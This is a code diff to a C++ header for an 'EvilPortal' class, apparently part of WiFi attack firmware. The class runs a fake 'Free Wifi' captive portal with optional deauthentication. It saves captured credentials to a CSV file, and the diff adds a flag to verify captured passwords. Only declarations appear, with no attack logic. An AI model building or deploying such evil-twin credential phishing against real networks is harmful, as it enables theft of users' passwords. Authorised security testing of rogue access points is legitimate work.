@@ -11,7 +11,7 @@ public:
     /////////////////////////////////////////////////////////////////////////////////////
     // Constructor
     /////////////////////////////////////////////////////////////////////////////////////
-    EvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false);
+    EvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false);
     ~EvilPortal();
 
     /////////////////////////////////////////////////////////////////////////////////////
@@ -29,9 +29,11 @@ private:
 
     uint8_t _channel;
     bool _deauth;
-
+    bool _verifyPwd;
+    
     String apName = "Free Wifi";
     String outputFile = "default_creds.csv";
+
     String htmlPage;
     String htmlFileName;
     bool isDefaultHtml = true;
@@ -44,7 +46,7 @@ private:
     String capturedCredentialsHtml = "";
 
     void portalController(void);
-    void credsController(bool verify = false);
+    void credsController();
     bool verifyCreds(String &Ssid, String &Password);
     void restartWiFi(bool reset=true);
     void resetCapturedCredentials(void);
@@ -53,8 +55,8 @@ private:
     void debounceButtonPress(void);
     void loadCustomHtml(void);
     void loadDefaultHtml(void);
+    void loadDefaultHtml_one(void);
     String wifiLoadPage(void);
-    String wifiLoadErrorPage(void);
     void saveToCSV(const String &csvLine, bool IsAPname = false);
     void drawScreen(bool holdDeauth);
 
